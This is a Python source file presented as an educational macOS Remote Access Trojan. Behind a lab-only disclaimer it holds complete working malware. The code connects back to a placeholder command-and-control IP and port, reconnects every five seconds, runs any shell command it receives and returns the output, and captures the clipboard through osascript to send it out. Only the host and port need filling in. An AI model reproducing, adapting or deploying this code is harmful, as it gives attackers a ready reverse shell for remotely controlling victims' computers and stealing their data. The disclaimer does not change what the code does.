"""
RAT Education Script (rat.py)
--------------------------------
⚠️ DISCLAIMER:
This script is provided **strictly for cybersecurity education and research** in a **controlled lab environment** only.
It is NOT intended for real-world malicious use. Unauthorized access to computer systems is illegal.

This example shows how a basic Remote Access Trojan (RAT) structure works on macOS for learning
about reverse shells, network monitoring, and defensive detection using tools like Suricata or Wireshark.

Before using in labs:
- Replace placeholder values with your lab C2 IP and Port.
- Run inside isolated virtual machines or sandboxed environments only.
"""

import socket
import subprocess
import os
import logging
import time

# === 📝 Logging Configuration ===
# Logs educational events and errors for review.
logging.basicConfig(
    filename="rat-education.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s"
)

# === 🧠 Placeholders for Lab Setup ===
HOST = "XXX.XXX.XXX.XXX"  # ← Replace with your Kali / lab VM IP (e.g., 192.168.56.101)
PORT = 0000              # ← Replace with your chosen port (e.g., 4444)

def main():
    # Optional: Set a starting directory (macOS example)
    try:
        os.chdir(os.path.expanduser("~"))
        logging.info(f"Initial directory set to {os.getcwd()}")
    except Exception as e:
        logging.error(f"Initial directory error: {e}")

    while True:
        try:
            # === 🔌 Connect to C2 Server (Lab Only) ===
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            logging.info(f"Connected to C2: {HOST}:{PORT}")
            print(f"[+] Connected to C2: {HOST}:{PORT}")

            while True:
                data = s.recv(1024).decode().strip()
                if not data:
                    break

                logging.info(f"Received command: {data}")

                # === 📁 Change Directory Command ===
                if data.startswith("cd "):
                    try:
                        path = data[3:].strip()
                        if path.startswith("~"):
                            path = os.path.expanduser(path)
                        os.chdir(path)
                        s.send(f"Changed directory to {os.getcwd()}\n".encode())
                    except Exception as e:
                        s.send(f"cd error: {str(e)}\n".encode())

                # === 📋 Clipboard Capture (macOS Only) ===
                elif data == "getclip":
                    try:
                        output = subprocess.check_output(
                            'osascript -e "get the clipboard as text"',
                            shell=True,
                            stderr=subprocess.STDOUT,
                            text=True
                        )
                        if output.strip():
                            s.send(f"Clipboard: {output}\n".encode())
                        else:
                            s.send("Clipboard is empty\n".encode())
                    except Exception as e:
                        s.send(f"Clipboard error: {str(e)}\n".encode())

                # === 🧠 Command Execution ===
                else:
                    try:
                        output = subprocess.check_output(
                            data,
                            shell=True,
                            stderr=subprocess.STDOUT,
                            text=True
                        )
                        s.send(output.encode() + b"\n")
                    except Exception as e:
                        s.send(f"Command error: {str(e)}\n".encode())

        except Exception as e:
            logging.error(f"C2 connection error: {e}")
            print(f"[!] C2 connection error: {e}")
            s.close()
            time.sleep(5)  # Retry after 5 seconds

if __name__ == "__main__":
    main()

